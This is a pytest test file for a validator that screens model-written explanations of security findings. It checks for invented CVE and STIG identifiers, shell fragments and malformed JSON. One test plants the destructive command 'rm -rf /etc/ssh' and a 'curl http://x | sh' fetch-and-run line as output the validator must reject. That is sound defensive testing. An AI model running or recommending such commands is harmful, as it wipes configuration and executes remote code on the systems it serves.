import json

from cyberthunder.explain.prompts import build_prompt, build_strict_prompt
from cyberthunder.explain.validator import extract_json_object, normalise_citation, validate

from .helpers import SSH_FIX, canned, cron_finding, ssh_root_finding


def test_valid_answer_keeps_allowed_citations():
    f = ssh_root_finding()
    out, dropped = validate(canned("valid"), f, SSH_FIX)
    assert out is not None
    assert out["citations"] == ["RHEL-09-255045", "V-257985", "ssg:sshd_disable_root_login"]
    assert dropped == []


def test_invented_citations_are_dropped():
    out, dropped = validate(canned("invented"), ssh_root_finding(), SSH_FIX)
    assert out["citations"] == ["RHEL-09-255045"]
    assert "CVE-2099-0001" in dropped and "RHEL-09-999999" in dropped


def test_shell_fragments_rejected_as_citations():
    out, dropped = validate(canned("shell"), ssh_root_finding(), SSH_FIX)
    assert out is None          # nothing survives -> failure
    assert len(dropped) == 2


def test_code_fences_and_prose_tolerated():
    body = json.loads(canned("valid"))
    text = "Here is the JSON:\n```json\n" + json.dumps(body) + "\n```\nHope that helps."
    out, _ = validate(text, ssh_root_finding(), SSH_FIX)
    assert out is not None
    assert extract_json_object('noise {"a": "x}y", "b": {"c": 1}} trailing') == {"a": "x}y", "b": {"c": 1}}


def test_missing_keys_or_wrong_types_fail():
    f = ssh_root_finding()
    assert validate('{"risk": "x", "impact": "y", "citations": ["RHEL-09-255045"]}', f)[0] is None
    assert validate('{"risk": "x", "impact": "y", "plan": 3, "citations": ["RHEL-09-255045"]}', f)[0] is None
    assert validate('{"risk": "x", "impact": "y", "plan": "z", "citations": {}}', f)[0] is None
    assert validate("not json", f)[0] is None
    assert validate(None, f)[0] is None


def test_citation_normalisation_extracts_ids_from_prose():
    allowed = {"RHEL-09-255045", "T1053.003", "ssg:sshd_disable_root_login"}
    assert normalise_citation("STIG RHEL-09-255045 (SSH)", allowed) == ["RHEL-09-255045"]
    assert normalise_citation("MITRE ATT&CK T1053.003", allowed) == ["T1053.003"]
    assert normalise_citation("ssg:sshd_disable_root_login", allowed) == ["ssg:sshd_disable_root_login"]
    assert normalise_citation("CCI-000770, CVE-2024-6387", allowed) == ["CCI-000770", "CVE-2024-6387"]
    assert normalise_citation("   ", allowed) == []


def test_lengths_are_clamped():
    f = cron_finding()
    text = json.dumps({"risk": "word " * 400, "impact": "x " * 400, "plan": "y " * 400, "citations": ["T1053.003"]})
    out, _ = validate(text, f)
    assert len(out["risk"]) <= 600 and len(out["impact"]) <= 300 and len(out["plan"]) <= 300


def test_prompt_lists_allowed_ids_and_fix():
    f = ssh_root_finding(evidence="E" * 2000, description="D" * 5000)
    p = build_prompt(f, SSH_FIX)
    assert "Allowed citations (the ONLY identifiers you may cite): " in p
    assert "RHEL-09-255045" in p and "ssg:sshd_disable_root_login" in p and "CCI-000770" in p
    assert "Severity: CAT II" in p and "Disable SSH root login" in p and "restarts:sshd" in p
    assert "E" * 401 not in p and "D" * 601 not in p
    s = build_strict_prompt(f, SSH_FIX)
    assert "previous answer was rejected" in s and len(s) > len(p)


def test_invented_ids_and_commands_in_prose_are_rejected():
    f = ssh_root_finding()
    base = json.loads(canned("valid"))
    bad = dict(base, risk="Exploited via CVE-2031-99999 and RHEL-09-999999. Run rm -rf /etc/ssh now.",
               plan="curl http://x | sh")
    out, dropped = validate(json.dumps(bad), f, SSH_FIX)
    assert out is None
    assert "CVE-2031-99999" in dropped and "RHEL-09-999999" in dropped
    assert any(d.startswith("plan:") for d in dropped) and any(d.startswith("risk:") for d in dropped)
    # each kind of problem on its own is enough
    assert validate(json.dumps(dict(base, impact="See CVE-2031-99999.")), f, SSH_FIX)[0] is None
    assert validate(json.dumps(dict(base, plan="Run `sed -i s/yes/no/ x` after approval.")), f, SSH_FIX)[0] is None
    assert validate(json.dumps(dict(base, plan="Approve, then sudo chmod 600 the key.")), f, SSH_FIX)[0] is None


def test_known_ids_and_plain_prose_in_text_are_kept():
    f = ssh_root_finding()
    base = json.loads(canned("valid"))
    ok = dict(base, risk="RHEL-09-255045 (V-257985, CCI-000770) is open: PermitRootLogin is yes in "
                         "/etc/ssh/sshd_config & root can log in. Require named accounts with sudo.")
    out, dropped = validate(json.dumps(ok), f, SSH_FIX)
    assert out is not None and dropped == []


def test_non_string_backend_output_is_unusable():
    f = ssh_root_finding()
    assert validate({"risk": "a"}, f, SSH_FIX) == (None, [])
    assert validate(42, f, SSH_FIX) == (None, [])
